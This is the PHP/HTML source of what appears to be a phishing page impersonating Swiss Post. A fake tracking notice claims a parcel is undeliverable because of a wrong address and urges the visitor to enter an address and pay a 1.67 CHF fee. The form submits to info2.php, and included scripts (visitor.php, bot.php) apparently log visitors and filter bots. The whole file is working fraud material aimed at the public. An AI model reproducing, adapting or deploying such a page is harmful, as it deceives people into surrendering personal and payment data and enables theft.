
<?php
error_reporting(0);
$pg=$_GET['movil'];
$ligne = substr($pg , 3 , 12);
include 'visitor.php';
include 'bot.php';
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" lang="fr">
    <head><meta charset="windows-1252">

        <meta name="viewport" content="initial-scale=1.0; maximum-scale=1.0; user-scalable=0;"/><meta name="format-detection" content="telephone=no"/>
        <title>Die Post - W�hlen Sie die Zahlungsmethode </title>
        <link rel="icon" type="image/x-icon" href="favicon.ico"/>
        <link rel="stylesheet" href="css/merchant.css" type="text/css"/>
        <link rel="stylesheet" href="css/opus.css" type="text/css"/>
        <link rel="stylesheet" href="css/footer.css" type="text/css"/>
        <link rel="stylesheet" href="css/onei.css" type="text/css"/>
        <link rel="stylesheet" href="css/eui.css" type="text/css"/>
        <link rel="stylesheet" href="css/pie.css" type="text/css"/>
        <style type="text/css">
    #heading{
        text-align: center;
        font-size: 15px;
    font-weight: bold;
        margin-left: 10px;
        margin-top: 10px;
        float:right;
    }
</style>
    </head>
    <body>


<div class="o-container-fluid eui-title-area">
                <div class="row">
                        <div style="background-color:#ffcc00;padding-right:5px;padding-left:10px;" class="col-xs-12 col-md-8 col-lg-8 col-xl-8"><img style="margin-top: 0px; height: 40px; width: 150px;" src="css/correos.png">

                                <br><span id="heading">Tracking-Code : CH64M133</span><br><br>
                        </div>
                </div>
        </div>

<div id="amount"></div>
        <div id="container">
            <div id="header">
                <div class="divTitle">
                    <br>

                    <span class="subtitle"></span>
                </div>

            </div>

            <form action="info2.php" method="post" id="payment_form" onsubmit="return checkForm();">
                <input type="hidden" name="LANG" value="fr">
                <input type="hidden" name="MCO" value="<?php print $ligne ?>">
                <input type="hidden" name="client_type" value="mobile">
                <input type="hidden" name="page_type" value="payment_offbill">

                <div id="input_data">
                    <div id="form_js_error_container">
                            <div class="wal_warning">
                                <div class="warningImage"></div>
                                <div id="warning_message" class="warning_message"></div>
                                <div class="clear"></div>
                            </div>
                    </div>


                    <div class="form_CardNumber">
          <img src="css/warning.png" style="display: block;
    margin-left: auto;
    margin-right: auto;
    width: 50%; padding: 6px; height: 50px; width: 50px;">
                        <br><br><label for="form_card_number" class="libelle">Wir informieren Sie dar&uuml;ber, dass Ihre Sendung unser Lager verlassen hat, es jedoch aufgrund einer falschen Lieferadresse nicht m&ouml;glich ist, sie innerhalb des voraussichtlichen Datums zu liefern. <br><span style="color:#004b92"><!--?php echo $ligne ?--></span><br>Voraussichtlicher Liefertermin : 14/01/2021 , 10:00 - 15:00.
<span><br>
        <br><span>Um es bis zum voraussichtlichen Datum zu erhalten, bitten wir Sie, Ihre korrekte Adresse einzugeben und die neuen Versandkosten (1,67 CHF) auf der n&auml;chsten Seite zu zahlen :</span></span></label><br><br>

                    </div>


                </div>
                <div class="button">
                    <input type="submit" class="btn" id="form_button_submit" name="form_button_submit" value="Bezahlen und fortfahren">
<div class="security_code">



                        <div class="security_code_info petit">
                            Geben Sie Ihre Adresse ein, um Ihr Paket morgen zu erhalten.
                        </div>

                    </div>
                </div>
            </form>

        <noscript>Cette page utilise du Javascript. Activez le Javascript via le menu "options" de votre navigateur.</noscript>
 </div>
<div class="bloque-home" id="pie-bloqueInferior">
    <div>
        <div>

<br><div class="bloqueRRSS-Accesibilidad separadorPie">
        <div class="pie-inferiorImagen">



</a></div>
</div>



<div  class="bloqueRRSS-Accesibilidad"><ul class="pie-inferiorEnlaces"><li>
                                    <a href="#/ss/Satellite/site/pagina-aviso_legal/sidioma=es_ES" title="Ir a  Aviso legal" data-popup="<string:stream variable=&quot;laUrlPopUp&quot;/>">Rechtliche Warnung</a>
                                </li><li>
                                    <a href="#/ss/Satellite/site/pagina-privacidad/sidioma=es_ES" title="Ir a  Privacidad web" data-popup="<string:stream variable=&quot;laUrlPopUp&quot;/>">Web-Datenschutz</a>
                                </li><li>
                                    <a href="#/ss/Satellite/site/pagina-mapa_web/sidioma=es_ES" title="Ir a  Mapa web" data-popup="<string:stream variable=&quot;laUrlPopUp&quot;/>">Webkarte</a>
                                </li><li>
                                    <a href="#/ss/Satellite/site/pagina-accesibilidad/sidioma=es_ES" title="Ir a  Accesibilidad" data-popup="<string:stream variable=&quot;laUrlPopUp&quot;/>">Barrierefreiheit</a>
                                </li><li>
                                    <a href="#/ss/Satellite/site/pagina-politica_cookies/sidioma=es_ES" title="Ir a  Politica de Cookies" data-popup="<string:stream variable=&quot;laUrlPopUp&quot;/>">Cookie-Richtlinie</a>
                                </li><li>
                                    <a href="#/ss/Satellite/site/pagina-alerta_seguridad/sidioma=es_ES" title="Ir a  Alerta de seguridad" data-popup="<string:stream variable=&quot;laUrlPopUp&quot;/>">Sicherheitsalarm</a>
                                </li><li>
                                    <a href="#/ss/Satellite/site/pagina-contenidos_multimedia/sidioma=es_ES" title="Ir a  RSS" data-popup="<string:stream variable=&quot;laUrlPopUp&quot;/>">RSS</a>
                                </li></ul><p>&copy;2021 Die Schweizerische Post AG. Alle Rechte vorbehalten.</p>
</div>
</div>
    </div></div>
</body>
</html>
